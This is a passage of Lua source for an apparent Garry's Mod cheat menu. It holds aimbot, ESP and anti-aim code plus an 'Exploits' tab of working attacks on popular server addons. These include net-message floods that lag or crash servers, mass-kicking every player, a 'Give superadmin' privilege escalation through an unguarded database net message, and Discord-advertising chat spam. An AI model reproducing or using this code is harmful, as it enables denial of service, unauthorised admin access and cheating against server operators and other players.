					net.Start("pac_submit")
					net.SendToServer()
				end
			end)
		end
	end
	}
	
	BigExploits["Lagger 8"] = {func = 
	function()
		if pMenu.IsNetString("steamid2") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for i = 1, 300 do
					net.Start( "steamid2" )
					net.WriteString( "S P I C Y " )
					net.SendToServer()
				end
			end)
		end
	end
	}
	BigExploits["Lagger 9"] = {func = 
	function()
		if pMenu.IsNetString("NDES_SelectedEmblem") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for i=1, 2000 do
					net.Start("NDES_SelectedEmblem")
					net.WriteString("exploitcity has to be a joke they can be for real.")
					net.SendToServer()
				end
			end)
		end
	end
	}
	BigExploits["Lagger 10"] = {func = 
	function()
		if pMenu.IsNetString("join_disconnect") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for i=1, 3000 do
					net.Start("join_disconnect")
					net.WriteEntity(table.Random(player.GetAll()))
					net.SendToServer()
				end
			end)
		end
	end
	}
	BigExploits["PAC Crash Server old"] = {func = 
	function()
		if pMenu.IsNetString("pac_to_contraption") then
			local tbl = {}
	 
			for i=1,1000000000 do
	 
				tbl[#tbl + 1] = i
	 
			end
	 
			net.Start("pac_to_contraption")
			 
			net.WriteTable( tbl )
			 
			net.SendToServer()
		end
	end
	}
	BigExploits["NLRKick"] = {func = 
	function()
		if pMenu.IsNetString("NLRKick") then
			for k,v in pairs(player.GetAll()) do
				if v == LocalPlayer() then
					continue;
				end
				net.Start("NLRKick")
				net.WriteEntity(v)
				net.SendToServer()
			end
		end
	end
	}
	BigExploits["B1g Crasher"] = {func = 
	function()
		if pMenu.IsNetString("Morpheus.StaffTracker") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for i=1, 2000 do
					net.Start("Morpheus.StaffTracker")
					net.SendToServer()
				end
			end)
		end
	end
	}
	BigExploits["Give superadmin"] = {func = 
	function()
		if pMenu.IsNetString("pplay_deleterow") then
			local id = LocalPlayer():SteamID()
			local tbl = {}
			tbl.name = "FAdmin_PlayerGroup"
			tbl.where = {"steamid",tostring(id)}
	
			net.Start("pplay_deleterow")
	
			net.WriteTable(tbl)
	
			net.SendToServer()
	
	
	
			local tbl = {}
	
			tbl.tblname = "FAdmin_PlayerGroup"
	
			tbl.tblinfo = {tostring(id),"superadmin"}
	
			net.Start("pplay_addrow")
	
			net.WriteTable(tbl)
			net.SendToServer()
		end
	end
	}
	BigExploits["pm spam"] = {func = 
	function()
		timer.Create(pMenu.RandomString(20),5,10,function()
			for k,v in pairs(player.GetAll()) do
				if v == LocalPlayer() then
					continue;
				end
				LocalPlayer():ConCommand("ulx psay "..v:Nick().." SERVER OWNED discord.gg/BszpW92 "..LocalPlayer():Nick())
			end
		end)
	end
	}
	BigExploits["asay spam"] = {func = 
	function()
		timer.Create(pMenu.RandomString(20),1.1,10,function()
			for i=1, ((1/FrameTime())) do
				LocalPlayer():ConCommand("ulx asay"..'"discord.gg/BszpW92')
			end
		end)
	end
	}
	
	function pMenu.MouseInArea(frame,minx,miny,maxx,maxy)
		local PosX,PosY = frame:GetPos()
		local posx,posy = gui.MousePos();
		return ((posx >= minx && posx <= maxx) && (posy >= miny && posy <= maxy));
	end
	function pMenu.DrawOutLinedRect(x,y,w,h,color)
		surface.SetDrawColor( color )
		surface.DrawOutlinedRect( x, y, w, h )
		surface.SetDrawColor( Color(255,255,255,255) )
	end
	function pMenu.DrawRect(x,y,w,h,color)
		surface.SetDrawColor( color )
		surface.DrawRect( x, y, w, h )
		surface.SetDrawColor( Color(255,255,255,255) )
	end
	function pMenu.Drawline(x,y,x2,y2,color)
		surface.SetDrawColor(color)
		surface.DrawLine(x,y,x2,y2)
		surface.SetDrawColor( Color(255,255,255,255) )
	end
	function pMenu.DrawCircle(X,Y,radius,numSides,color)
		local Step = PI * 2.0 / numSides;
		local old = 0;
		for a=0,PI*2.0,Step do
			local X1 = radius * math.cos(a) + X;
			local Y1 = radius * math.sin(a) + Y;
			local X2 = radius * math.cos(a + Step) + X;
			local Y2 = radius * math.sin(a + Step) + Y;
			surface.SetDrawColor( color )
			surface.DrawLine(X1, Y1, X2, Y2);
		end
	end
	function pMenu.DrawSlider(frame,x,y,w,h,slider,min,max,startval,round)
		if round == nil then
			round = false;
		end
		max = max - min
		if pMenuVars.Sliders[slider] == nil then
			pMenuVars.Sliders[slider] = {min = min, max = max, value = startval}
		end
		local PosX,PosY = frame:GetPos()
		local NewX,NewY = PosX + x,PosY + y
		pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
		if input.IsMouseDown(MOUSE_LEFT) && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
			local MX,MY = gui.MousePos();
			local MXF,MYF = MX - NewX + x,MY - NewY + y
			if round == false then
				pMenuVars.Sliders[slider].value = math.Clamp(math.Round((((MXF - x) / w) * max + min)),min,max + min)
			else
				pMenuVars.Sliders[slider].value = math.Clamp((((MXF - x) / w) * max + min),min,max + min)
			end
		end
		local val = pMenuVars.Sliders[slider].value;
		local slid = (w - 10) / (max) * (val - min)
		pMenu.DrawRect(x + slid,y,10,h,Color(18,89,131,255))
		draw.SimpleText(val,"Font M",x + (w/2),y + 2,Color(255,255,255,255),TEXT_ALIGN_CENTER)
		pMenu.DrawOutLinedRect(x,y, w , h , Color( 0,255,255, 200 ))
	end
	function pMenu.DrawCheckBox(frame,x,y,CBOX,defvalue,text)
		local w,h = 20,20
		if pMenuVars.CheckBoxes[CBOX] == nil then
			pMenuVars.CheckBoxes[CBOX] = {value = defvalue,tez = 0}
		end
		local PosX,PosY = frame:GetPos()
		local NewX,NewY = PosX + x,PosY + y
		pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
		pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
		if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.CheckBoxes[CBOX].value then
			pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,59,101,255))
		end
		if input.IsMouseDown(MOUSE_LEFT) then
			pMenuVars.CheckBoxes[CBOX].tez = pMenuVars.CheckBoxes[CBOX].tez + 1
		else
			pMenuVars.CheckBoxes[CBOX].tez = 0;
		end
		if pMenuVars.CheckBoxes[CBOX].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
			pMenuVars.CheckBoxes[CBOX].value = !pMenuVars.CheckBoxes[CBOX].value;
		end
		if pMenuVars.CheckBoxes[CBOX].value then
			pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,89,131,255))
		end
		draw.SimpleText(text,"Font M",x + w + 5,y + 2,Color(255,255,255,255),TEXT_ALIGN_LEFT)
	end
	
	function pMenu.DrawTab(frame,x,y,w,h,NAME,defvalue)
		if pMenuVars.Tabs[NAME] == nil then
			pMenuVars.Tabs[NAME] = {value = defvalue,tez = 0}
		end
		local PosX,PosY = frame:GetPos()
		local NewX,NewY = PosX + x,PosY + y
		pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
		if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.Tabs[NAME].value then
			pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
		end
		if input.IsMouseDown(MOUSE_LEFT) then
			pMenuVars.Tabs[NAME].tez = pMenuVars.Tabs[NAME].tez + 1
		else
			pMenuVars.Tabs[NAME].tez = 0;
		end
		if pMenuVars.Tabs[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
			pMenuVars.Tabs[NAME].value = !pMenuVars.Tabs[NAME].value;
		end
		if pMenuVars.Tabs[NAME].value then
			pMenu.DrawRect(x,y,w,h,Color(18,89,131,255))
		end
		pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
		draw.SimpleText(NAME,"Font L",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
	end
	function pMenu.DrawExploit(frame,x,y,w,h,NAME,func,text1,text2)
		if pMenuVars.Exploits[NAME] == nil then
			pMenuVars.Exploits[NAME] = {func = func,tez = 0}
		end
		local PosX,PosY = frame:GetPos()
		local NewX,NewY = PosX + x,PosY + y
		pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
		if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
			pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
		end
		if input.IsMouseDown(MOUSE_LEFT) then
			pMenuVars.Exploits[NAME].tez = pMenuVars.Exploits[NAME].tez + 1
		else
			pMenuVars.Exploits[NAME].tez = 0;
		end
		if pMenuVars.Exploits[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
			pMenuVars.Exploits[NAME].func();
		end
		pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
		if text2 == nil then
			draw.SimpleText(text1,"Font M",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
		else
			draw.SimpleText(text1,"Font M",x + w/2,y + h/2 - 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
			draw.SimpleText(text2,"Font M",x + w/2,y + h/2 + 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
		end
	end
	local firsttime = true
	local Frame = NULL;
	
	
	
	
	function pMenu.Menu()
		Frame = vgui.Create( "DFrame" )
		Frame:SetTitle( "" )
		Frame:SetSize( 700, 500 )
		Frame:Center()
		Frame:ShowCloseButton(false)
		Frame:MakePopup()
		Frame.Paint = function( self, w, h )
			pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
			pMenu.DrawRect(0, 0, w, 20, Color( 18,89,131, 255 ))
			pMenu.DrawOutLinedRect(0, 0, w, 20, Color( 0,255,255, 200 ))
			pMenu.DrawOutLinedRect(0, 0, w, h, Color( 0,255,255, 200 ))
			pMenu.DrawRect(5, 25, 125, h - 30, Color( 18,89,131, 100 ))
			pMenu.DrawOutLinedRect(5, 25, 125, h - 30, Color( 0,255,255, 200 ))
			pMenu.DrawOutLinedRect(135, 25, w - 140, h - 30, Color( 0,255,255, 200 ))
			draw.SimpleText("BIG MENU (Delete для открытия/закрытия меню)","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
			local Aimbot = "Aimbot";
			local Visuals = "Visuals";
			local b1gExploits = "Exploits"
			local misc = "misc"
			local hvh = "HvH"
			pMenu.DrawTab(Frame,10,30,115,50,Aimbot,true)
			pMenu.DrawTab(Frame,10,85,115,50,Visuals,true)
			pMenu.DrawTab(Frame,10,140,115,50,b1gExploits,true)
			pMenu.DrawTab(Frame,10,195,115,50,misc,true) 
			pMenu.DrawTab(Frame,10,250,115,50,hvh,true) 
			if pMenuVars.Tabs[Visuals].value then
				pMenu.DrawCheckBox(Frame,170,55,"ESP",true,"Enable ESP")
	
				pMenu.Drawline(160,95,350,95,Color(0,255,255,255))
	
				pMenu.DrawCheckBox(Frame,150,115,"ESP Name",true,"Name")
				pMenu.DrawCheckBox(Frame,150,145,"ESP BoundingBox",true,"Bounding Box")
				pMenu.DrawCheckBox(Frame,150,175,"ESP HealthBar",true,"Health Bar")
				pMenu.DrawCheckBox(Frame,150,205,"ESP Traceline",true,"Eye Traceline")
				draw.SimpleText("Traceline Distance","Font M",150,237,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,150,265,210,20,"ESP Traceline Distance",25,  250,  71)
				pMenu.DrawCheckBox(Frame,150,295,"ESP Position",false,"Position")
				pMenu.DrawCheckBox(Frame,150,325,"ESP Angles",false,"Eye Angles")
				pMenu.DrawCheckBox(Frame,150,355,"ESP Glow",false,"Glow")
				pMenu.DrawCheckBox(Frame,150,385,"ESP Chams",false,"Chams")
				pMenu.DrawCheckBox(Frame,150,415,"ESP XQZ",false,"XQZ")
				pMenu.DrawCheckBox(Frame,150,445,"ESP WeaponCham",false,"Weapon Chams")
	
	
				draw.SimpleText("Box Color","Font M",390,35,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				draw.SimpleText("R","Font M",660,55,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,55,260,20,"ESP BoxColor.r",0,  255,  255)
				draw.SimpleText("G","Font M",660,80,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,80,260,20,"ESP BoxColor.g",0,  255,  0)
				draw.SimpleText("B","Font M",660,105,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,105,260,20,"ESP BoxColor.b",0,  255,  255)
	
				draw.SimpleText("Text Color","Font M",390,130,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				draw.SimpleText("R","Font M",660,150,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,150,260,20,"ESP TextColor.r",0,  255,  255)
				draw.SimpleText("G","Font M",660,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,175,260,20,"ESP TextColor.g",0,  255,  206)
				draw.SimpleText("B","Font M",660,200,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,200,260,20,"ESP TextColor.b",0,  255,  121)
	
				draw.SimpleText("Chams Visible","Font M",390,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				draw.SimpleText("R","Font M",660,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,250,260,20,"ESP ChamVisColor.r",0,  255,  10)
				draw.SimpleText("G","Font M",660,275,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,275,260,20,"ESP ChamVisColor.g",0,  255,  206)
				draw.SimpleText("B","Font M",660,300,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,300,260,20,"ESP ChamVisColor.b",0,  255,  4)
	
				draw.SimpleText("Chams Non-Visible","Font M",390,325,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				draw.SimpleText("R","Font M",660,350,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,350,260,20,"ESP ChamNVisColor.r",0,  255,  70)
				draw.SimpleText("G","Font M",660,375,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,375,260,20,"ESP ChamNVisColor.g",0,  255,  70)
				draw.SimpleText("B","Font M",660,400,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,390,400,260,20,"ESP ChamNVisColor.b",0,  255,  255)
	
				pMenu.Drawline(375,30,375,490,Color(0,255,255,255))
			end
			if pMenuVars.Tabs[misc].value then
				pMenu.DrawCheckBox(Frame,170,55,"MISC Thirdperson",false,"Enable ThirdPerson")
				draw.SimpleText("Distance","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,170,105,260,20,"MISC Thirdperson Distance",10,  300,  100)
				pMenu.DrawCheckBox(Frame,170,135,"MISC Bhop",true,"Enable Bunnyhop")
				pMenu.DrawCheckBox(Frame,170,165,"MISC Autostrafe",true,"Enable Autostrafe")
				pMenu.DrawCheckBox(Frame,170,195,"MISC Text to speech is fucking aids",false,"Enable Text to Speech")
			end
			if pMenuVars.Tabs[b1gExploits].value then
				if pMenu.IsNetString("duelrequestguiYes")then
					pMenu.DrawExploit(Frame,140,30,170,50,"Duel Moniez",BigExploits["Duel Moniez"].func,"Dueling","Give b1g money")
				end
				if pMenu.IsNetString("drugseffect_remove") then
					pMenu.DrawExploit(Frame,140,85,170,50,"Drugsmod remove all weapons?",BigExploits["Drugsmod remove all weapons?"].func,"Drugsmod","Strip all Weapons?")
				end
				if pMenu.IsNetString("drugs_money") then
					pMenu.DrawExploit(Frame,140,140,170,50,"Drugsmod remove all money?",BigExploits["Drugsmod remove all money?"].func,"Drugsmod","Remove all money?")
				end
				if pMenu.IsNetString("drugs_ignite") then
					pMenu.DrawExploit(Frame,140,195,170,50,"Drugsmod ignite all props?",BigExploits["Drugsmod ignite all props?"].func,"Drugsmod","ignite all props?")
				end
				if pMenu.IsNetString("drugs_text") then
					pMenu.DrawExploit(Frame,140,250,170,50,"Drugsmod remove all props?",BigExploits["Drugsmod remove all props?"].func,"Drugsmod","Remove all props?")
				end
				if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
					pMenu.DrawExploit(Frame,140,305,170,50,"TGN Advanced Money Printer Take Monie",BigExploits["TGN Advanced Money Printer Take Monie"].func,"TGN Advanced Printer","Take all money")
				end
				if pMenu.IsNetString("DL_Answering") then
					pMenu.DrawExploit(Frame,140,360,170,50,"Logging thing Kick All players?",BigExploits["Logging thing Kick All players?"].func,"Logging thing","Kick all players")
				end
				if pMenu.IsNetString("SimplicityAC_aysent") then
					pMenu.DrawExploit(Frame,140,415,170,50,"SimplicityAC Crash Server",BigExploits["SimplicityAC Crash Server"].func,"SimplicityAC","Crash Server")
				end
				if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
					pMenu.DrawExploit(Frame,315,30,170,50,"Auzlex's Teleport System Lag",BigExploits["Auzlex's Teleport System Lag"].func,"Auzlex's Teleport System","Lag Server for 5 min")
				end
				if pMenu.IsNetString("CFRemoveGame") then
					pMenu.DrawExploit(Frame,315,85,170,50,"Lagger 2",BigExploits["Lagger 2"].func,"Lagger 2 (5 min)")
				end
				if pMenu.IsNetString("CreateCase") then
					pMenu.DrawExploit(Frame,315,140,170,50,"Lagger 3",BigExploits["Lagger 3"].func,"Lagger 3 (5 min)")
				end
				if pMenu.IsNetString("rprotect_terminal_settings") then
					pMenu.DrawExploit(Frame,315,195,170,50,"Lagger 4",BigExploits["Lagger 4"].func,"Lagger 4 (5 min)")
				end
				if pMenu.IsNetString("StackGhost") then
					pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 5",BigExploits["Lagger 5"].func,"Lagger 5 (5 min)")
				end
				if pMenu.IsNetString("JoinOrg") then
					pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 6",BigExploits["Lagger 6"].func,"Lagger 6 (5 min)")
				end
				if pMenu.IsNetString("pac_submit") then
					pMenu.DrawExploit(Frame,315,305,170,50,"Lagger 7",BigExploits["Lagger 7"].func,"Lagger 7 (5 min)")
				end
				if pMenu.IsNetString("pac_to_contraption") then
					pMenu.DrawExploit(Frame,315,360,170,50,"PAC Crash Server old",BigExploits["PAC Crash Server old"].func,"PAC (patched on some)","Crash Server")
				end
				if pMenu.IsNetString("NLRKick") then
					pMenu.DrawExploit(Frame,315,415,170,50,"NLRKick",BigExploits["NLRKick"].func,"NLR","Kick everyone (but you)")
				end
				if pMenu.IsNetString("steamid2") then
					pMenu.DrawExploit(Frame,490,30,170,50,"Lagger 8",BigExploits["Lagger 8"].func,"Lagger 8 (5min)")
				end
				if pMenu.IsNetString("NDES_SelectedEmblem") then
					pMenu.DrawExploit(Frame,490,85,170,50,"Lagger 9",BigExploits["Lagger 9"].func,"Lagger 9 (5min)")
				end
				if pMenu.IsNetString("join_disconnect") then
					pMenu.DrawExploit(Frame,490,140,170,50,"Lagger 10",BigExploits["Lagger 10"].func,"Lagger 10 (5min)")
				end
				if pMenu.IsNetString("Morpheus.StaffTracker") then
					pMenu.DrawExploit(Frame,490,195,170,50,"B1g Crasher",BigExploits["B1g Crasher"].func,"B1g Crasher")
				end
				if pMenu.IsNetString("pplay_deleterow") then
					pMenu.DrawExploit(Frame,490,250,170,50,"Give superadmin",BigExploits["Give superadmin"].func,"Give superadmin")
				end
				pMenu.DrawExploit(Frame,490,305,170,50,"pm spam",BigExploits["pm spam"].func,"Spam")
				pMenu.DrawExploit(Frame,490,360,170,50,"asay spam",BigExploits["asay spam"].func,"asay spam")
				draw.SimpleText("Defqon pExploitcity ","Font L",140,470,Color(255,255,255,255),TEXT_ALIGN_LEFT)
			end
			if pMenuVars.Tabs[Aimbot].value then
				pMenu.DrawCheckBox(Frame,170,55,"Aibmot Enable",false,"Enable")
				draw.SimpleText("Aimbot FOV","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,170,105,490,20,"Aimbot FOV",1,  360,  10,true)
	
				pMenu.DrawCheckBox(Frame,170,140,"Aibmot Smooth",false,"Smooth movement")
				draw.SimpleText("Smooth amount","Font M",170,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,170,190,225,20,"Aimbot Smooth AMT",1,  100,  5)
	
				pMenu.DrawCheckBox(Frame,410,140,"Aibmot Show fov circle",false,"Aibmot FOV circle (sort of accurate)")
				draw.SimpleText("Circle color","Font M",410,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				draw.SimpleText("R","Font M",645,190,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,410,190,225,20,"Aimbot Circle.r",1,  255,  255)
				draw.SimpleText("G","Font M",645,215,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,410,215,225,20,"Aimbot Circle.g",1,  255,  255)
				draw.SimpleText("B","Font M",645,240,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,410,240,225,20,"Aimbot Circle.b",1,  255,  1)
				draw.SimpleText("A","Font M",645,265,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,410,265,225,20,"Aimbot Circle.a",1,  255,  255) // 159
	
				draw.SimpleText("Aimkey (wiki.garrysmod.com/page/Enums/KEY) Default: Left Alt","Font M",170,290,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,170,315,490,20,"Aimbot Key",1,  159,  81)
	
				draw.SimpleText("Aimspot (default values): 1 = head, 2 = neck,3 = top of the spine","Font M",170,340,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				draw.SimpleText("4 = center spine,5 = stomach.   More can be added at the top of the code","Font M",170,360,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,170,385,490,20,"Aimbot Bone",1,  #AimbotPoints,  1)
			end
			if pMenuVars.Tabs[hvh].value then
				pMenu.DrawCheckBox(Frame,170,55,"HvH Enable",false,"Enable")
				pMenu.DrawCheckBox(Frame,170,100,"HvH Antiaim",false,"Enable AntiAim")
				draw.SimpleText("Pitch Angle","Font M",170,125,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,170,150,490,20,"HvH Pitch",-360,  360,  -180.05332,true)
				draw.SimpleText("Yaw Angle","Font M",170,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,170,200,490,20,"HvH Yaw",-360,  360,  -80,true)
				draw.SimpleText("Style: 1 jitter spin, 2 spin, 3 random,4 at player,5 static,6 yaw + cam.y","Font M",170,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
				pMenu.DrawSlider(Frame,170,250,200,20,"HvH Style",1,  6,  4)
				if pMenuVars.Sliders["HvH Style"].value == 2 then
					draw.SimpleText("Spin Speed (ang  + (IntervalPerTick + Number)","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
					pMenu.DrawSlider(Frame,380,275,285,20,"HvH Spin Speed",1,  1000,  235)
				elseif pMenuVars.Sliders["HvH Style"].value == 3 then
					draw.SimpleText("Random min/max","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
					pMenu.DrawSlider(Frame,380,275,200,20,"HvH randomY",1,  180,  45)
				end
	
				pMenu.DrawCheckBox(Frame,170,310,"HvH Autoshoot",false,"Autoshoot")
				pMenu.DrawCheckBox(Frame,170,460,"HvH pList",false,"pList")
			end
			if firsttime then
				pMenuVars.Tabs[Visuals].value = false;
				pMenuVars.Tabs[misc].value = false;
				pMenuVars.Tabs[b1gExploits].value = false;
				pMenuVars.Tabs[Aimbot].value = false;
				pMenuVars.Tabs[hvh].value = true;
			end
			firsttime = false;
		end
		local PList = vgui.Create( "DFrame" )
		PList:SetTitle( "" )
		PList:SetSize( 300, ScrH() )
		PList:SetPos(0,0)
		PList:ShowCloseButton(false)
		PList:MakePopup()
		PList.Paint = function( self, w, h )
			if pMenuVars.CheckBoxes["HvH pList"] != nil && pMenuVars.CheckBoxes["HvH pList"].value then
				if pMenuVars.Tabs["HvH"].value != nil && pMenuVars.Tabs["HvH"].value then
					pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
					draw.SimpleText("PList","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
					draw.SimpleText("dont shooting?","Font M",w/2,21,Color(255,255,255,255),TEXT_ALIGN_CENTER)
					draw.SimpleText("User It! :)","Font M",w/2,42,Color(255,255,255,255),TEXT_ALIGN_CENTER)
					local up = 20;
					local add = 50
					local k = 0;
					for _,v in pairs(player.GetAll()) do
						k = k + 1;
						if v == LocalPlayer() then
							k = k -1
							continue;
						end
						pMenu.DrawOutLinedRect(10,up + (k * add),280,44,Color(255,255,255,255))
						pMenu.DrawRect(10,up + (k * add),280,44,Color(18,89,131,170))
						draw.SimpleText(v:Nick(),"Font M",12,up + (k * add) + 3,Color(0,255,255,255))
	
						draw.SimpleText("P:","Font M",175,up + (k * add) + 3,Color(0,255,255,255))
						pMenu.DrawSlider(PList,190,up + (k * add),100,22,v:SteamID().."Force Pitch",-180,  180,  0,true)
						draw.SimpleText("Y:","Font M",175,up + (k * add) + 24,Color(0,255,255,255))
						pMenu.DrawSlider(PList,190,up + (k * add)+22,100,22,v:SteamID().."Force Yaw",-180,  180,  0,true)
	
						pMenu.DrawCheckBox(PList,11,up + (k * add) + 23,v:SteamID().."Baim",false,"baim")
						pMenu.DrawCheckBox(PList,75,up + (k * add) + 23,v:SteamID().."Force Ang",false,"Force Ang")
					end
				end
			end
			if Frame == NULL then
				self:Close()
			end
		end
	end
	
	function pMenu.boundingbox(ply)
		local iBoxWidth = 26;
		local iBoxHeight = 71;
		
		local pos = ply:GetBonePosition(ply:LookupBone( "ValveBiped.Bip01_Spine" ));
		if (ply:Crouching()) then
			pos = Vector(pos.x, pos.y, pos.z - 27);
			iBoxHeight = 55;
		else
			pos = Vector(pos.x,pos.y,pos.z - 42.5);
		end
	
		local points = {
			Vector(pos.x - iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z ),
			Vector(pos.x - iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z ), 
			Vector(pos.x + iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z ), 
			Vector(pos.x + iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z ), 
			Vector(pos.x + iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z + iBoxHeight), 
			Vector(pos.x - iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z + iBoxHeight), 
			Vector(pos.x - iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z + iBoxHeight), 
			Vector(pos.x + iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z + iBoxHeight),
		};
		local flb = points[4]:ToScreen();
		local brt = points[6]:ToScreen();
		local blb = points[1]:ToScreen();
		local frt = points[5]:ToScreen();
		local frb = points[3]:ToScreen();
		local brb = points[2]:ToScreen();
		local blt = points[7]:ToScreen();
		local flt = points[8]:ToScreen();
		local arr = { flb, brt, blb, frt, frb, brb, blt, flt };
	
		local t1 = flb.x;      
		local t2 = flb.y;        
		local t3 = flb.x;   
		local t4 = flb.y;   
	
		for i=1,8 do
			if (t1 > arr[i].x) then
				t1 = arr[i].x;
			end
			if (t4 < arr[i].y) then
				t4 = arr[i].y;
			end
			if (t3 < arr[i].x) then
				t3 = arr[i].x;
			end
			if (t2 > arr[i].y) then
				t2 = arr[i].y; 
			end
		end
		return t1,t3,t2,t4;
	end
	function pMenu.PredictPos(pos)
		local myvel = LocalPlayer():GetVelocity()
		local pos = pos - (myvel * engine.TickInterval()); 
		return pos;
	end
	function pMenu.SmoothAngle(angle,me,SmoothPercent)
		local first = Vector(angle.x - me.x, math.NormalizeAngle(angle.y - me.y), 0.0);
		local smoothX = me.x + first.x / 100 * SmoothPercent;
		local smoothY = me.y + first.y / 100 * SmoothPercent;
		return Angle(smoothX, math.NormalizeAngle(smoothY), 0.0);
	end
	function pMenu.GetAngle(src, dst)
		local delta = pMenu.PredictPos(Vector(dst.x - src.x, dst.y - src.y, dst.z - src.z));
		local hyp = math.sqrt(delta.x * delta.x + delta.y * delta.y);
		local pitch = math.atan(delta.z/hyp) * Rad * -1;
		local yaw = math.atan(delta.y / delta.x) * Rad;
		if (delta.x >= 0) then
			yaw = yaw + 180;
		end
		return Angle(pitch, math.NormalizeAngle(yaw - 180), 0.0);
	end
	function pMenu.GetAngleVector(src, dst)
		local delta = pMenu.PredictPos(Vector(dst.x - src.x, dst.y - src.y, dst.z - src.z));
		local hyp = math.sqrt(delta.x * delta.x + delta.y * delta.y);
		local pitch = math.atan(delta.z/hyp) * Rad * -1;
		local yaw = math.atan(delta.y / delta.x) * Rad;
		if (delta.x >= 0) then
			yaw = yaw + 180;
		end
		return Vector(pitch, math.NormalizeAngle(yaw - 180), 0.0);
	end
	function pMenu.ClosestEntToCross(limit,pcmd,bonee,Angle)
		if limit == nil then
			limit = 360;
		end
		local curAng = Vector(Angle.x,Angle.y + 180,0);
		local curEye = LocalPlayer():EyePos()
		local ret = NULL
		local retDist = 1000;
		for k,v in pairs(player.GetAll()) do
			if v == LocalPlayer() || !v:Alive() then
				continue;
			end
			local pos = Vector(0,0,0);
			if bonee != nil then
